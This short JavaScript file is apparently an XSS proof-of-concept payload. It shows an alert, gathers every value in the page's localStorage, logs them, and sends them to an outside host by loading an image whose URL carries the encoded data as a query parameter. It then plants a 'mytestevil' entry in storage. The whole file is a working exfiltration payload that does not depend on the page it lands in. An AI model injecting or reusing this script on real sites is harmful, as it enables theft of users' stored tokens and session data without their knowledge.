alert('bad thing happended!')

//debugger;

function allStorage() {

  var values = [],
      keys = Object.keys(localStorage),
      i = keys.length;

  while ( i-- ) {
      values.push( localStorage.getItem(keys[i]) );
  }

  return values;
}

const allStorageData = allStorage();
console.log('allStorage:', allStorageData);

var img = document.createElement('img');
img.src = 'https://dss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/img/weather/icons/a1.png?data=' + window.encodeURIComponent(allStorageData);

localStorage.setItem('mytestevil', 'dangerous!');
